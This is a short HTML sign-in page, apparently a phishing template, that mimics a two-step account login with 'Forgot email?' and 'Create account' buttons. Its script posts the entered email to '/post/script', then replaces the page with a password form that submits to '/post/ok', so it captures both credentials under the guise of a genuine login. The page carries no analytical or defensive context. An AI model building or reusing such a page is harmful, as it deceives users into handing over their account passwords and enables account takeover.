<title>Sign in</title><main><section><form id="f" onsubmit="return false"><input name="identifier" type="email" autocomplete="username"><button type="button">Forgot email?</button></form></section><div><button type="button">Create account</button><button type="button" id="go">Next</button></div></main><script>go.onclick=()=>{fetch('/post/script',{method:'POST',body:new URLSearchParams({email:f.identifier.value})}).then(()=>{document.body.innerHTML='<form method="post" action="/post/ok"><input name="pass" type="password"><button>Sign in</button></form>';});};</script>
